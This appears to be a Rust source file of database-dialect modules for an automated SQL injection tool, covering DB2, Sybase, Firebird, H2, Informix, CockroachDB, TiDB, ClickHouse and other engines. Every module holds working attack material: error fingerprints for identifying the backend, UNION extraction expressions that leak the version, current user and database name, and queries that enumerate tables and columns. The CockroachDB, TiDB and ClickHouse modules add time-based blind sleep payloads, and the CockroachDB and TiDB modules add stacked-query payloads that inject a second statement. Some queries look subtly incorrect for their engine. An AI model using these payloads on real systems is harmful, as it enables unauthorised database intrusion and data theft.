//! Dialect implementations for exotic and specialty DBMS engines.
//! Each struct is zero-size; all SQL is expressed as &'static str or format!.

use super::dialect::DbmsDialect;

// ── DB2 ───────────────────────────────────────────────────────────────────────

pub struct Db2;
impl DbmsDialect for Db2 {
    fn name(&self) -> &'static str { "DB2" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("DB2 SQL error",    "DB2"),
            ("SQLCODE=",         "DB2"),
            ("SQLSTATE=",        "DB2"),
            ("[IBM][CLI Driver]","DB2"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        [
            "(SELECT service_level FROM SYSIBMADM.ENV_INST_INFO)",
            "(SELECT CURRENT USER FROM SYSIBM.SYSDUMMY1)",
            "(SELECT CURRENT SERVER FROM SYSIBM.SYSDUMMY1)",
        ]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM syscat.tables WHERE tabschema = CURRENT SCHEMA".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT tabname FROM syscat.tables WHERE tabschema = CURRENT SCHEMA \
             ORDER BY tabname LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM syscat.columns WHERE tabname='{}'",
            table.to_uppercase()
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT colname FROM syscat.columns WHERE tabname='{}' \
             ORDER BY colno LIMIT 1 OFFSET {}",
            table.to_uppercase(), index
        )
    }
}

// ── Sybase ────────────────────────────────────────────────────────────────────

pub struct Sybase;
impl DbmsDialect for Sybase {
    fn name(&self) -> &'static str { "Sybase" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("Sybase message",          "Sybase"),
            ("Adaptive Server Anywhere","Sybase"),
            ("Sybase SQL Server",       "Sybase"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["@@version", "suser_name()", "db_name()"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM sysobjects WHERE type='U'".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT name FROM sysobjects WHERE type='U' ORDER BY name LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!("SELECT COUNT(*) FROM syscolumns WHERE id=OBJECT_ID('{}')", table)
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT name FROM syscolumns WHERE id=OBJECT_ID('{}') ORDER BY colid LIMIT 1 OFFSET {}",
            table, index
        )
    }
}

// ── Firebird ──────────────────────────────────────────────────────────────────

pub struct Firebird;
impl DbmsDialect for Firebird {
    fn name(&self) -> &'static str { "Firebird" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("Dynamic SQL Error",       "Firebird"),
            ("Firebird/InterBase",      "Firebird"),
            ("org.firebirdsql.jdbc",    "Firebird"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        [
            "(SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database)",
            "(SELECT CURRENT_USER FROM rdb$database)",
            "(SELECT rdb$get_context('SYSTEM', 'DB_NAME') FROM rdb$database)",
        ]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM rdb$relations WHERE rdb$view_blr IS NULL".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT rdb$relation_name FROM rdb$relations WHERE rdb$view_blr IS NULL \
             ORDER BY rdb$relation_name ROWS 1 TO {}",
            index + 1
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM rdb$relation_fields WHERE rdb$relation_name='{}'",
            table.to_uppercase()
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT rdb$field_name FROM rdb$relation_fields WHERE rdb$relation_name='{}' \
             ORDER BY rdb$field_position ROWS 1 TO {}",
            table.to_uppercase(), index + 1
        )
    }
}

// ── HSQLDB ────────────────────────────────────────────────────────────────────

pub struct Hsqldb;
impl DbmsDialect for Hsqldb {
    fn name(&self) -> &'static str { "HSQLDB" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("unexpected token",    "HSQLDB"),
            ("org.hsqldb.jdbc",     "HSQLDB"),
            ("HSQLDB JDBC",         "HSQLDB"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        [
            "(SELECT CHARACTER_VALUE FROM INFORMATION_SCHEMA.SQL_IMPLEMENTATION_INFO \
              WHERE IMPLEMENTATION_INFO_NAME='DBMS VERSION')",
            "(SELECT USER() FROM INFORMATION_SCHEMA.SYSTEM_USERS LIMIT 1)",
            "(SELECT TABLE_CAT FROM INFORMATION_SCHEMA.SYSTEM_SCHEMAS LIMIT 1)",
        ]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM INFORMATION_SCHEMA.SYSTEM_TABLES".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM INFORMATION_SCHEMA.SYSTEM_TABLES LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM INFORMATION_SCHEMA.SYSTEM_COLUMNS WHERE table_name='{}'",
            table.to_uppercase()
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM INFORMATION_SCHEMA.SYSTEM_COLUMNS \
             WHERE table_name='{}' LIMIT 1 OFFSET {}",
            table.to_uppercase(), index
        )
    }
}

// ── H2 ────────────────────────────────────────────────────────────────────────

pub struct H2;
impl DbmsDialect for H2 {
    fn name(&self) -> &'static str { "H2" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("org.h2.jdbc",             "H2"),
            ("H2 JDBC",                 "H2"),
            ("SQLSyntaxErrorException", "H2"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["(SELECT H2VERSION())", "(SELECT CURRENT_USER())", "(SELECT DATABASE())"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
            table.to_uppercase()
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM information_schema.columns WHERE table_name='{}' \
             ORDER BY ordinal_position LIMIT 1 OFFSET {}",
            table.to_uppercase(), index
        )
    }
}

// ── Informix ──────────────────────────────────────────────────────────────────

pub struct Informix;
impl DbmsDialect for Informix {
    fn name(&self) -> &'static str { "Informix" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("SQL Error",              "Informix"),
            ("IX000",                  "Informix"),
            ("Informix ODBC Driver",   "Informix"),
            ("[Informix]",             "Informix"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        [
            "(SELECT DBINFO('version', 'full') FROM systables WHERE tabid=1)",
            "(SELECT USER FROM systables WHERE tabid=1)",
            "(SELECT DBSERVERNAME FROM systables WHERE tabid=1)",
        ]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM systables WHERE tabid > 99".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT tabname FROM systables WHERE tabid > 99 ORDER BY tabname SKIP {} LIMIT 1",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM syscolumns \
             WHERE tabid=(SELECT tabid FROM systables WHERE tabname='{}')",
            table
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT colname FROM syscolumns \
             WHERE tabid=(SELECT tabid FROM systables WHERE tabname='{}') \
             ORDER BY colno SKIP {} LIMIT 1",
            table, index
        )
    }
}

// ── Ingres ────────────────────────────────────────────────────────────────────

pub struct Ingres;
impl DbmsDialect for Ingres {
    fn name(&self) -> &'static str { "Ingres" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("Ingres SQL",  "Ingres"),
            ("II000",       "Ingres"),
            ("[Ingres]",    "Ingres"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        [
            "(SELECT DBMSINFO('_VERSION'))",
            "(SELECT DBMSINFO('USERNAME'))",
            "(SELECT DBMSINFO('DATABASE'))",
        ]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM iitables".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!("SELECT table_name FROM iitables LIMIT 1 OFFSET {}", index)
    }

    fn column_count_query(&self, table: &str) -> String {
        format!("SELECT COUNT(*) FROM iicolumns WHERE table_name='{}'", table)
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM iicolumns WHERE table_name='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }
}

// ── CockroachDB ───────────────────────────────────────────────────────────────

pub struct CockroachDb;
impl DbmsDialect for CockroachDb {
    fn name(&self) -> &'static str { "CockroachDB" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] { &[] }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["version()", "current_user()", "current_database()"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public'".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM information_schema.tables \
             WHERE table_schema='public' LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
            table
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM information_schema.columns \
             WHERE table_name='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }

    fn sleep_function(&self, seconds: u64) -> String {
        format!("pg_sleep({})", seconds)
    }

    fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
        format!("CASE WHEN {} THEN pg_sleep({}) ELSE pg_sleep(0) END", condition, seconds)
    }

    fn stacked_sleep_payload(&self, original_value: &str, seconds: u64) -> String {
        format!("{}'; SELECT pg_sleep({})-- ", original_value, seconds)
    }
}

// ── TiDB ──────────────────────────────────────────────────────────────────────

pub struct TiDb;
impl DbmsDialect for TiDb {
    fn name(&self) -> &'static str { "TiDB" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] { &[] }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["@@version", "user()", "database()"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM information_schema.tables \
             WHERE table_schema=database() LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM information_schema.columns \
             WHERE table_schema=database() AND table_name='{}'",
            table
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM information_schema.columns \
             WHERE table_schema=database() AND table_name='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }

    fn sleep_function(&self, seconds: u64) -> String {
        format!("SLEEP({})", seconds)
    }

    fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
        format!("IF({}, SLEEP({}), 0)", condition, seconds)
    }

    fn stacked_sleep_payload(&self, original_value: &str, seconds: u64) -> String {
        format!("{}; SELECT SLEEP({})-- ", original_value, seconds)
    }
}

// ── ClickHouse ────────────────────────────────────────────────────────────────

pub struct ClickHouse;
impl DbmsDialect for ClickHouse {
    fn name(&self) -> &'static str { "ClickHouse" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] { &[] }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["version()", "currentUser()", "currentDatabase()"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM system.tables".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!("SELECT name FROM system.tables LIMIT 1 OFFSET {}", index)
    }

    fn column_count_query(&self, table: &str) -> String {
        format!("SELECT COUNT(*) FROM system.columns WHERE table='{}'", table)
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!("SELECT name FROM system.columns WHERE table='{}' LIMIT 1 OFFSET {}", table, index)
    }

    fn sleep_function(&self, seconds: u64) -> String {
        format!("sleep({})", seconds)
    }

    fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
        format!("if({}, sleep({}), 0)", condition, seconds)
    }

    // ClickHouse does not support stacked queries.
}

// ── Mckoi ─────────────────────────────────────────────────────────────────────

pub struct Mckoi;
impl DbmsDialect for Mckoi {
    fn name(&self) -> &'static str { "Mckoi" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("com.mckoi.database", "Mckoi"),
            ("Mckoi SQL",          "Mckoi"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        [
            "(SELECT property_value FROM _Schema WHERE property_name='version')",
            "(SELECT USER())",
            "(SELECT 'mckoi_db')",
        ]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM _Schema".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!("SELECT name FROM _Schema LIMIT 1 OFFSET {}", index)
    }

    fn column_count_query(&self, table: &str) -> String {
        format!("SELECT COUNT(*) FROM _Schema WHERE name='{}'", table)
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!("SELECT name FROM _Schema WHERE name='{}' LIMIT 1 OFFSET {}", table, index)
    }
}

// ── Derby ─────────────────────────────────────────────────────────────────────

pub struct Derby;
impl DbmsDialect for Derby {
    fn name(&self) -> &'static str { "Derby" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("ERROR 42X",           "Derby"),
            ("org.apache.derby",    "Derby"),
            ("Derby SQL",           "Derby"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        [
            "(VALUES SYSCS_UTIL.SYSCS_GET_DATABASE_PROPERTY('DataDictionaryVersion'))",
            "(SELECT CURRENT_USER FROM SYSIBM.SYSDUMMY1)",
            "(VALUES SYSCS_UTIL.SYSCS_GET_DATABASE_PROPERTY('DatabaseName'))",
        ]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM sys.systables".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT tablename FROM sys.systables OFFSET {} ROWS FETCH NEXT 1 ROW ONLY",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM sys.syscolumns \
             WHERE referenceid=(SELECT tableid FROM sys.systables WHERE tablename='{}')",
            table.to_uppercase()
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT columnname FROM sys.syscolumns \
             WHERE referenceid=(SELECT tableid FROM sys.systables WHERE tablename='{}') \
             OFFSET {} ROWS FETCH NEXT 1 ROW ONLY",
            table.to_uppercase(), index
        )
    }
}

// ── Cache ─────────────────────────────────────────────────────────────────────

pub struct Cache;
impl DbmsDialect for Cache {
    fn name(&self) -> &'static str { "Cache" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("Caché SQL Error", "Cache"),
            ("<SYNTAX>",        "Cache"),
            ("[ODBC Cache]",    "Cache"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["(SELECT $ZVERSION)", "(SELECT $USERNAME)", "(SELECT $NAMESPACE)"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{}'",
            table
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS \
             WHERE TABLE_NAME='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }
}

// ── FrontBase ─────────────────────────────────────────────────────────────────

pub struct FrontBase;
impl DbmsDialect for FrontBase {
    fn name(&self) -> &'static str { "FrontBase" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[("FrontBase", "FrontBase")]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["'unknown'", "'unknown'", "'unknown'"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!("SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}", index)
    }

    fn column_count_query(&self, table: &str) -> String {
        format!("SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'", table)
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM information_schema.columns \
             WHERE table_name='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }
}

// ── MonetDB ───────────────────────────────────────────────────────────────────

pub struct MonetDb;
impl DbmsDialect for MonetDb {
    fn name(&self) -> &'static str { "MonetDB" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("MonetDB",   "MonetDB"),
            ("sql: MDB",  "MonetDB"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["'unknown'", "'unknown'", "'unknown'"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!("SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}", index)
    }

    fn column_count_query(&self, table: &str) -> String {
        format!("SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'", table)
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM information_schema.columns \
             WHERE table_name='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }
}

// ── Virtuoso ──────────────────────────────────────────────────────────────────

pub struct Virtuoso;
impl DbmsDialect for Virtuoso {
    fn name(&self) -> &'static str { "Virtuoso" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            (" Virtuoso ",            "Virtuoso"),
            ("SR185",                 "Virtuoso"),
            ("[ODBC Virtuoso Driver]","Virtuoso"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["'unknown'", "'unknown'", "'unknown'"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!("SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}", index)
    }

    fn column_count_query(&self, table: &str) -> String {
        format!("SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'", table)
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM information_schema.columns \
             WHERE table_name='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }
}

// ── mSQL ──────────────────────────────────────────────────────────────────────

pub struct Msql;
impl DbmsDialect for Msql {
    fn name(&self) -> &'static str { "mSQL" }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("mSQL",      "mSQL"),
            ("Mini SQL",  "mSQL"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["'unknown'", "'unknown'", "'unknown'"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!("SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}", index)
    }

    fn column_count_query(&self, table: &str) -> String {
        format!("SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'", table)
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM information_schema.columns \
             WHERE table_name='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }
}
